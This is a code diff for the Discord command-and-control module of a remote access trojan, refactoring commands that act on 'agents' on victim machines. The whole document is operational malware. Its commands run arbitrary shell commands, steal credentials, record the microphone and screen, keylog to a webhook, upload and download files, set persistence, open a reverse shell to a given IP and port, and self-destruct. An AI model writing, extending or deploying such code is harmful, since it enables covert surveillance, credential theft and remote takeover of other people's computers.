@@ -5,23 +5,29 @@ import threading
 import discord
 from discord.ext import commands
 from code.discord.bot import BOT
+from code.discord.cogs.allowedGuild import is_allowed_guild
 from code.discord.interactButton import InteractButton
 from libraries import maciassdopia, keylogger
 
 
 class HybridCommands(commands.Cog):
 
-    def __init__(self, bot:BOT, guild:discord.Object, id:str, keylog_webhook:str):
+    def __init__(self, bot:BOT):
         self.bot = bot
-        self.guild = guild
-        self.id = id
-        self.keylog_webhook = keylog_webhook
+        self.guild = bot.guild
+        self.id = bot.id
+        self.keylog_webhook = bot.keylog_webhook
         self.current_agent = 0
 
 
     @commands.hybrid_command(name = "interact", with_app_command = True, description = "Interact with an agent")
-    async def interact(self, ctx:commands.Context, id:int):
-        self.current_agent = id
+    @is_allowed_guild
+    async def interact(self, ctx:commands.Context, id:str):
+        if self.id == id:
+            self.bot.active_interactions = True
+        else:
+            self.bot.active_interactions = False
+
         my_embed = discord.Embed(
             title = f"Interacting with Agent#{id}",
             color = 0x00FF00
@@ -30,8 +36,9 @@ class HybridCommands(commands.Cog):
 
 
     @commands.hybrid_command(name = "interact-all", with_app_command = True, description = "Interact with all agents")
+    @is_allowed_guild
     async def interact_all(self, ctx:commands.Context):
-        self.current_agent = self.id
+        self.bot.active_interactions = True
         my_embed = discord.Embed(
             title = f"Interacting with all agents",
             color = 0x00FF00
@@ -40,6 +47,7 @@ class HybridCommands(commands.Cog):
 
 
     @commands.hybrid_command(name = "background", with_app_command = True, description = "Background an agent")
+    @is_allowed_guild
     async def background(self, ctx:commands.Context):
         self.current_agent = 0
         my_embed = discord.Embed(
@@ -50,8 +58,9 @@ class HybridCommands(commands.Cog):
 
 
     @commands.hybrid_command(name = "cmd", with_app_command = True, description = "Run any command on the target machine")
+    @is_allowed_guild
     async def cmd(self, ctx:commands.Context, command:str):
-        if (int(self.current_agent) == int(self.id)):
+        if self.bot.active_interactions:
             result = maciassdopia.cmd(command)
             if len(result) > 2000:
                 path = os.environ["temp"] + "\\response.txt"
@@ -64,6 +73,7 @@ class HybridCommands(commands.Cog):
 
 
     @commands.hybrid_command(name = "cmd-all", with_app_command = True, description = "Run any command on the all online agents")
+    @is_allowed_guild
     async def cmd_all(self, ctx:commands.Context, command:str):
         result = maciassdopia.cmd(command)
         if len(result) > 2000:
@@ -77,8 +87,9 @@ class HybridCommands(commands.Cog):
 
 
     @commands.hybrid_command(name = "webshot", with_app_command = True, description = "Capture a picture from the target machine's screen")
+    @is_allowed_guild
     async def webshot(self, ctx:commands.Context):
-        if (int(self.current_agent) == int(self.id)):
+         if self.bot.active_interactions:
             if ctx.interaction:
                 my_embed = discord.Embed(
                     title = f"Please use **!webshot {self.id}** instead of the slash command",
@@ -99,8 +110,9 @@ class HybridCommands(commands.Cog):
 
 
     @commands.hybrid_command(name = "cd", with_app_command = True, description = "Change the current directory on the target machine")
+    @is_allowed_guild
     async def cd(self, ctx:commands.Context, path:str):
-        if (int(self.current_agent) == int(self.id)):
+         if self.bot.active_interactions:
             result = maciassdopia.cd(path)
             if (result):
                 my_embed = discord.Embed(
@@ -117,8 +129,9 @@ class HybridCommands(commands.Cog):
 
 
     @commands.hybrid_command(name = "process", with_app_command = True, description = "List all the processes running on the target machine")
-    async def upload(self, ctx:commands.Context):
-        if (int(self.current_agent) == int(self.id)):
+    @is_allowed_guild
+    async def process(self, ctx:commands.Context):
+         if self.bot.active_interactions:
             result = maciassdopia.process()
             if len(result) > 2000:
                 path = os.environ["temp"] + "\\response.txt"
@@ -131,8 +144,9 @@ class HybridCommands(commands.Cog):
 
 
     @commands.hybrid_command(name = "upload", with_app_command = True, description = "Upload a file to the agent")
+    @is_allowed_guild
     async def upload(self, ctx:commands.Context, url:str, name:str):
-        if (int(self.current_agent) == int(self.id)):
+         if self.bot.active_interactions:
             result = maciassdopia.upload(url, name)
             if result:
                 my_embed = discord.Embed(
@@ -148,8 +162,9 @@ class HybridCommands(commands.Cog):
 
 
     @commands.hybrid_command(name = "screenshot", with_app_command = True, description = "Take a screenshot of the target machine's screen")
+    @is_allowed_guild
     async def screenshot(self, ctx:commands.Context):
-        if (int(self.current_agent) == int(self.id)):
+         if self.bot.active_interactions:
             result = maciassdopia.screenshot()
             if result != False:
                 await ctx.reply(file = discord.File(result))
@@ -163,8 +178,9 @@ class HybridCommands(commands.Cog):
 
 
     @commands.hybrid_command(name = "creds", with_app_command = True, description = "Get the credentials of the target machine")
+    @is_allowed_guild
     async def creds(self, ctx:commands.Context):
-        if (int(self.current_agent) == int(self.id)):
+         if self.bot.active_interactions:
             result = maciassdopia.creds()
             if result != False:
                 await ctx.reply(file = discord.File(result))
@@ -178,8 +194,9 @@ class HybridCommands(commands.Cog):
 
 
     @commands.hybrid_command(name = "persistent", with_app_command = True, description = "Make the agent persistent on the target machine")
+    @is_allowed_guild
     async def persistent(self, ctx:commands.Context):
-        if (int(self.current_agent) == int(self.id)):
+         if self.bot.active_interactions:
             result = maciassdopia.persistent()
             if result:
                 my_embed = discord.Embed(
@@ -195,6 +212,7 @@ class HybridCommands(commands.Cog):
 
 
     @commands.hybrid_command(name = "ls", with_app_command = True, description = "List all the current online agents")
+    @is_allowed_guild
     async def ls(self, ctx: commands.Context):
         if ctx.interaction:
             my_embed = discord.Embed(
@@ -222,8 +240,9 @@ class HybridCommands(commands.Cog):
 
 
     @commands.hybrid_command(name = "download", with_app_command = True, description = "Download file from the target machine")
+    @is_allowed_guild
     async def download(self, ctx:commands.Context, path:str):
-        if (int(self.current_agent) == int(self.id)):
+         if self.bot.active_interactions:
             try:
                 await ctx.reply(f"**Agent #{self.id}** Requested File", file = discord.File(path))
             except Exception as e:
@@ -235,8 +254,9 @@ class HybridCommands(commands.Cog):
 
 
     @commands.hybrid_command(name = "terminate", with_app_command = True, description = "Terminate the agent")
-    async def download(self, ctx:commands.Context):
-        if (int(self.current_agent) == int(self.id)):
+    @is_allowed_guild
+    async def terminate(self, ctx:commands.Context):
+         if self.bot.active_interactions:
             my_embed = discord.Embed(
                 title=f"Terminating connection with Agent#{self.id}",
                 color=0x00FF00
@@ -247,8 +267,9 @@ class HybridCommands(commands.Cog):
 
 
     @commands.hybrid_command(name = "selfdestruct", with_app_command = True, description = "Delete the agent from the target machine")
+    @is_allowed_guild
     async def selfdestruct(self, ctx:commands.Context):
-        if (int(self.current_agent) == int(self.id)):
+         if self.bot.active_interactions:
             result = maciassdopia.selfdestruct()
             if result:
                 my_embed = discord.Embed(
@@ -264,8 +285,9 @@ class HybridCommands(commands.Cog):
 
 
     @commands.hybrid_command(name = "location", with_app_command = True, description = "Get the location of the target machine")
+    @is_allowed_guild
     async def location(self, ctx:commands.Context):
-        if (int(self.current_agent) == int(self.id)):
+         if self.bot.active_interactions:
             response = maciassdopia.location()
             if response != False:
                 my_embed = discord.Embed(
@@ -287,8 +309,9 @@ class HybridCommands(commands.Cog):
 
 
     @commands.hybrid_command(name = "revshell", with_app_command = True, description = "Get a reverse shell on the target machine")
-    async def location(self, ctx:commands.Context, ip:str, port:str):
-        if (int(self.current_agent) == int(self.id)):
+    @is_allowed_guild
+    async def revshell(self, ctx:commands.Context, ip:str, port:str):
+         if self.bot.active_interactions:
             result = maciassdopia.revshell(ip, port)
             if result:
                 my_embed = discord.Embed(
@@ -299,8 +322,9 @@ class HybridCommands(commands.Cog):
 
 
     @commands.hybrid_command(name = "recordmic", with_app_command = True, description = "Record the microphone of the target machine")
+    @is_allowed_guild
     async def recordmic(self, ctx:commands.Context, seconds:int):
-        if (int(self.current_agent) == int(self.id)):
+         if self.bot.active_interactions:
             if ctx.interaction:
                 my_embed = discord.Embed(
                     title = f"Please use **!recordmic {self.id}** instead of the slash command",
@@ -321,8 +345,9 @@ class HybridCommands(commands.Cog):
 
 
     @commands.hybrid_command(name = "wallpaper", with_app_command = True, description = "Change the wallpaper of the target machine")
+    @is_allowed_guild
     async def wallpaper(self, ctx:commands.Context, path_url:str):
-        if (int(self.current_agent) == int(self.id)):
+         if self.bot.active_interactions:
             result = maciassdopia.wallpaper(path_url)
             if result:
                 my_embed = discord.Embed(
@@ -338,8 +363,9 @@ class HybridCommands(commands.Cog):
 
 
     @commands.hybrid_command(name = "killproc", with_app_command = True, description = "Kill a process on the target machine")
+    @is_allowed_guild
     async def killproc(self, ctx:commands.Context, pid:int):
-        if (int(self.current_agent) == int(self.id)):
+         if self.bot.active_interactions:
             result = maciassdopia.killproc(pid)
             if result:
                 my_embed = discord.Embed(
@@ -355,8 +381,9 @@ class HybridCommands(commands.Cog):
 
 
     @commands.hybrid_command(name = "keylog", with_app_command = True, description = "Start a keylogger on the target machine")
+    @is_allowed_guild
     async def keylog(self, ctx:commands.Context, mode:str, interval:int):
-        if (int(self.current_agent) == int(self.id)):
+         if self.bot.active_interactions:
             logger = keylogger.Keylogger(
                 interval = interval,
                 ID = self.id,
@@ -379,8 +406,9 @@ class HybridCommands(commands.Cog):
             
             
     @commands.hybrid_command(name = "write", with_app_command = True, description = "Type specified characters on Agent")
+    @is_allowed_guild
     async def write(self, ctx:commands.Context, string:str, interval:float = 0.25):
-        if (int(self.current_agent) == int(self.id)):
+         if self.bot.active_interactions:
             result = maciassdopia.write(string, interval)
             if result:
                 my_embed = discord.Embed(
@@ -396,8 +424,9 @@ class HybridCommands(commands.Cog):
             
             
     @commands.hybrid_command(name = "press", with_app_command = True, description = "Press the selected key on Agent")
+    @is_allowed_guild
     async def press(self, ctx:commands.Context, letter:str):
-        if (int(self.current_agent) == int(self.id)):
+         if self.bot.active_interactions:
             result = maciassdopia.press(letter)
             if result:
                 my_embed = discord.Embed(
@@ -413,8 +442,9 @@ class HybridCommands(commands.Cog):
             
 
     @commands.hybrid_command(name = "message", with_app_command = True, description = "Show message box in the center of Agent screen")
-    async def type(self, ctx:commands.Context, message:str):
-        if (int(self.current_agent) == int(self.id)):
+    @is_allowed_guild
+    async def message(self, ctx:commands.Context, message:str):
+         if self.bot.active_interactions:
             result = maciassdopia.message(message)
             if result:
                 my_embed = discord.Embed(
@@ -430,7 +460,8 @@ class HybridCommands(commands.Cog):
 
 
     @commands.hybrid_command(name = "help", with_app_command = True, description = "Help menu")
-    async def keylog(self, ctx:commands.Context):
+    @is_allowed_guild
+    async def help(self, ctx:commands.Context):
         my_embed = discord.Embed(title=f"Help Menu", color=0x00FF00)
         my_embed.add_field(name="/help", value="Shows this menu", inline=False)
         my_embed.add_field(name="/interact <id>", value="Interact with a specific agent", inline=False)
@@ -459,6 +490,5 @@ class HybridCommands(commands.Cog):
         await ctx.reply(embed = my_embed)
 
 
-    @interact.before_invoke
-    async def before_invoke(self, ctx:commands.Context):
-        ctx.guild = self.guild
+async def setup(bot:BOT):
+    await bot.add_cog(HybridCommands(bot))
